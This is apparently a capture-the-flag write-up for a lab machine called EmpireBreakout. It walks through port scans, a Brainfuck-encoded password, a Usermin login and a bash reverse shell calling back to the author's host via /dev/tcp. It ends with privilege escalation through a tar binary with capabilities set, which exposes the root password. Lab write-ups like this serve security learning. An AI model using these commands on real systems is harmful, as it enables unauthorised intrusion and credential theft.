EmpireBreakout

Target IP: 192.168.227.238
Challenge Description: Can you manage to break your way out?

Reconnaissance


Performing a port scan shows there are three TCP ports open on the target machine, as shown above.


Performing an aggressive scan against the open TCP ports returns the result above. By the looks of it, there are three active HTTP applications on the target machine.

Enumeration

Port 80: HTTP

Browsing to the HTTP application on port 80 displays the default Apache installation webpage above.


However, the source-code of this webpage contains the interesting HTML comment above. The HTML comments contains the code ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++. in Brainfuck language.


I decoded this ciphertext and obtained the plaintext .2uqPEfj3D<P'a-3. Apparently according to the HTML comment, this is a password. But who does this belong to?

Port 10000: Webmin HTTP

Browsing to this port displays the web certificate above first. The email address root@breakout is interesting.


After accepting the certificate, the login webpage above is displayed. It looks like the target machine is running the Webmin application on this port. The source-code of this webpage does not contain anything useful. I tried spraying default credentials but I had no luck. I also tried root:.2uqPEfj3D<P'a-3, root@breakout:.2uqPEfj3D<P'a-3, and breakout:.2uqPEfj3D<P'a-3, but I had no luck. Time to enumerate harder. I enumerated the different ports and I did not find anything. I needed a hint here. Apparently a username cyber can be obtained through SMB. But the SMB was closed was for my target machine.

Port 20000: Usermin HTTP

The webpage above is displayed for this web application. The target machine is running Usermin.


After logging in successfully using the credentials cyber:.2uqPEfj3D<P'a-3, the webpage above is shown. From the image above, I have more information about the target machine. The hostname is breakout and OS is Linux. And the target machine is running the application Usermin 1.830, as shown above. After enumerating the application for some time, I found something useful.

Exploitation


This application allows the user of Command Shell, as shown above. In the image above, I executed the command ifconfig and received the output above. I can leverage this to deploy a reverse shell to connect to my machine.


I started a listener on my machine at port 8443. Then I deployed the bash reverse shell payload: /bin/bash -i >& /dev/tcp/192.168.45.242/8443 0>&1, from the Command Shell feature of this application to connect to my machine at port 8443. Now I have a foothold on the target machine with the session as cyber, as shown above.

Privilege Escalation


Running /usr/sbin/getcap / -r 2>/dev/null shows the interesting entry above. The binary tar has capabilities set. This is a serious vulnerability as this tar binary can be used to bypass file read permission checks, directory read, and execute permission checks.


I made a copy of the /root contents here. I used the commands below:

./tar cvf root /root
./tar -xvf root.tar
./tar cvf root /root
./tar -xvf root.tar


And the contents located at /root is shown above. The .bash_history contains the commands entered to backup the password of the root user.


By using tar binary again to copy the content of /var/backups/.old_pass.bak, I managed to obtain the password Ts&4&YurgtRX(=~h of the root user as shown above. Now I have a root shell on the target machine.
